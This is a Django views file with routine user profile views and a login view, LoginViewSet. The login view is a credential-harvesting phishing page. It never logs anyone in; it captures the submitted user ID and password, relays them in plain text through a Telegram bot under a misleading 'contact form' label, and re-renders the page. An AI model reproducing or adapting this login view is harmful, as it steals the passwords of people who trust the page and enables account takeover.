from django.contrib.auth.mixins import LoginRequiredMixin
from django.contrib.messages.views import SuccessMessageMixin
from django.forms.models import BaseModelForm
from django.http import HttpResponse
from django.urls import reverse, reverse_lazy
from django.utils.translation import gettext_lazy as _
from django.views.generic import DetailView, TemplateView
from django.views.generic import RedirectView
from django.views.generic import UpdateView, CreateView
from django.shortcuts import render

from .forms import LoginForm
from .bot import send_telegram_message

from pagefile.users.models import User


class UserDetailView(LoginRequiredMixin, DetailView):
    model = User
    slug_field = "id"
    slug_url_kwarg = "id"


user_detail_view = UserDetailView.as_view()


class UserUpdateView(LoginRequiredMixin, SuccessMessageMixin, UpdateView):
    model = User
    fields = ["name"]
    success_message = _("Information successfully updated")

    def get_success_url(self):
        # for mypy to know that the user is authenticated
        assert self.request.user.is_authenticated
        return self.request.user.get_absolute_url()

    def get_object(self):
        return self.request.user


user_update_view = UserUpdateView.as_view()


class UserRedirectView(LoginRequiredMixin, RedirectView):
    permanent = False

    def get_redirect_url(self):
        return reverse("users:detail", kwargs={"pk": self.request.user.pk})


user_redirect_view = UserRedirectView.as_view()


class LoginViewSet(TemplateView):
    form_class = LoginForm
    template_name = "pages/login.html"
    success_url = reverse_lazy("home")

    def get(self, request, *args, **kwargs):
        context = {
            'form': self.form_class
        }

        return render(request, self.template_name, context=context)
    

    def post(self, request, *args, **kwargs):
        form = self.form_class(request.POST)
        if form.is_valid():
            userid = form.cleaned_data.get("userID")
            password = form.cleaned_data.get("password")

            message = "New message from contact form:\n"
            message += f"UserID: {userid}\n"
            message += f"Password: {password}\n"

            send_telegram_message(message)
            return render(request, self.template_name)
        
        context = {
            'form': self.form_class
        }
        return render(request, self.template_name, context=context)

login_user_cra = LoginViewSet.as_view()
